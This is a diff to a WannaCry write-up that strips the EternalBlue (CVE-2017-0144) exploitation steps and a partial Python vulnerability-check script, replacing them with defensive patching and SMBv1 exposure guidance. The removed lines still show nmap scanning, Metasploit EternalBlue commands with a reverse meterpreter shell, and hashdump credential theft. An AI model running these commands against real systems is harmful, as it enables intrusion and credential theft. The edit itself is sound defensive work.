@@ -1157,78 +1157,16 @@ WannaCry Kill Chain:
 
 ### Vulnerability Details
 **CVE:** CVE-2017-0144  
-**Affected:** Windows SMB protocol  
+**Affected:** Microsoft Windows SMBv1 server on the versions listed in the advisories  
 **Type:** Remote code execution  
-**CVSS:** 8.1 (High)
+**CVSS:** 8.8 (High, CVSS 3.1 per [NIST NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-0144))
 
-### Exploitation Steps
+### Defensive Exposure Review
 
-```bash
-# 1. Scan for vulnerable systems
-nmap -p 445 --script smb-vuln-ms17-010 192.168.1.0/24
-
-# 2. Use Metasploit
-msfconsole
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 192.168.1.100
-set LHOST 192.168.1.10
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-check  # Verify vulnerability
-exploit
-
-# 3. Post-exploitation
-# Once meterpreter session obtained
-getsystem
-hashdump
-```
-
-### Manual Exploitation
-
-```python
-#!/usr/bin/env python3
-# eternalblue_check.py - Check for MS17-010 vulnerability
-
-import socket
-import struct
-
-def check_ms17_010(target_ip):
-    """Check if target is vulnerable to MS17-010"""
-    
-    port = 445
-    timeout = 5
-    
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(timeout)
-        sock.connect((target_ip, port))
-        
-        # Send SMB negotiation packet
-        negotiate = (
-            b"\x00\x00\x00\x2f"  # NetBIOS Session header
-            b"\xff\x53\x4d\x42"  # SMB header
-            # ... (full packet structure)
-        )
-        
-        sock.send(negotiate)
-        response = sock.recv(1024)
-        
-        # Check response for vulnerability indicators
-        if b"NT LM 0.12" in response:
-            print(f"[+] {target_ip} may be vulnerable to MS17-010")
-            return True
-        else:
-            print(f"[-] {target_ip} does not appear vulnerable")
-            return False
-            
-    except Exception as e:
-        print(f"[-] Error checking {target_ip}: {e}")
-        return False
-    finally:
-        sock.close()
-
-# Example usage
-check_ms17_010("192.168.1.100")
-```
+- **Patch status:** Check the managed asset and update inventory against the exact operating-system versions and security updates in [Microsoft bulletin MS17-010](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010). Unsupported systems need an approved isolation or replacement plan.
+- **Protocol exposure:** Confirm whether SMBv1 is required. Where it is not, follow Microsoft's [version-specific SMBv1 removal guidance](https://learn.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3), including dependency review and any required restart.
+- **Network boundaries:** Restrict SMB access to the segments and systems that need it. An open TCP port or an SMB negotiation response does not establish that a host is vulnerable or patched.
+- **Evidence quality:** Use authenticated configuration and patch records as the primary verification. Any authorized vulnerability assessment should use a maintained tool and a defined scope; do not infer CVE status from a protocol banner alone.
 
 [Return to Table of Contents](#table-of-contents---enhanced-edition)
 
